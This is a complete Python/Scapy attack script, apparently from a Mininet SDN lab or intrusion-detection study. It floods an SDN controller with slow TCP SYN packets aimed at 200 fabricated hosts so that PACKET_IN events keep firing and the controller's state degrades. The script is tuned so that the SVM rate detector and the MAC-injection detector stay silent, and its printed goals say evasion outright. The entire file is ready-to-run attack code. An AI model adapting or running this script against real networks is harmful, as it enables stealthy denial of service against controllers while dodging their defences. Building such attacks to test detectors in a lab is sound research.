#!/usr/bin/env python3

from scapy.all import Ether, IP, TCP, sendp
import random
import time
import itertools

# ==========================================
# STAGE-3 STEALTH CONTROL-PLANE ATTACK
# ==========================================

# Legitimate attacker identity
ATTACKER_MAC = "00:00:00:00:00:03"
ATTACKER_IP  = "10.0.0.3"

# Mininet interface
INTERFACE = "h3-eth0"

# ==========================================
# STEALTH CONFIGURATION
# ==========================================

# Very slow packet generation
# Keeps traffic below SVM thresholds
PACKET_DELAY = 2.0

# Total attack runtime
ATTACK_DURATION = 300

# Fixed destination service port
DST_PORT = 80

# ==========================================
# FAKE DESTINATION HOSTS
# ==========================================

fake_hosts = []

for i in range(200):

    fake_mac = f"02:11:22:33:{i//256:02x}:{i%256:02x}"

    fake_ip = f"10.0.1.{100 + (i % 100)}"

    fake_hosts.append((fake_mac, fake_ip))

# ==========================================
# ATTACK START
# ==========================================

print("=" * 60)
print("[STEALTH ATTACK STARTED]")
print("=" * 60)

print(f"[*] Source MAC        : {ATTACKER_MAC}")
print(f"[*] Source IP         : {ATTACKER_IP}")
print(f"[*] Interface         : {INTERFACE}")
print(f"[*] Fake Destinations : {len(fake_hosts)}")
print(f"[*] Packet Delay      : {PACKET_DELAY} sec")
print(f"[*] Attack Duration   : {ATTACK_DURATION} sec")

print("\n[*] Attack Goals:")
print("    - Avoid MAC injection detection")
print("    - Avoid SVM high-rate detection")
print("    - Slowly generate new flows")
print("    - Continuously trigger PACKET_IN")
print("    - Gradually increase controller workload")

print("=" * 60)

start_time = time.time()
packet_counter = 0

try:

    for dst_mac, dst_ip in itertools.cycle(fake_hosts):

        # Stop attack after configured duration
        if time.time() - start_time > ATTACK_DURATION:
            break

        # Create new TCP flow
        pkt = Ether(
            src=ATTACKER_MAC,
            dst=dst_mac
        )

        pkt /= IP(
            src=ATTACKER_IP,
            dst=dst_ip
        )

        pkt /= TCP(
            sport=random.randint(1024, 65535),
            dport=DST_PORT,
            flags="S"
        )

        # Send packet
        sendp(pkt, iface=INTERFACE, verbose=False)

        packet_counter += 1

        # Status output
        print(
            f"[+] Packet {packet_counter:<5} | "
            f"dst_mac={dst_mac} | "
            f"dst_ip={dst_ip}"
        )

        # IMPORTANT:
        # Slow stealth timing
        time.sleep(PACKET_DELAY)

except KeyboardInterrupt:

    print("\n[!] Attack interrupted by user")

finally:

    elapsed = time.time() - start_time

    print("\n" + "=" * 60)
    print("[STEALTH ATTACK FINISHED]")
    print("=" * 60)

    print(f"[*] Total packets sent : {packet_counter}")
    print(f"[*] Total runtime      : {elapsed:.2f} sec")

    if elapsed > 0:
        print(f"[*] Average rate       : {packet_counter / elapsed:.2f} pkt/sec")

    print("\n[*] Expected Controller Behavior:")
    print("    - SVM OUTPUT mostly remains 0")
    print("    - MAC detector does not trigger")
    print("    - Continuous PACKET_IN generation")
    print("    - Slow controller-state pollution")

    print("=" * 60)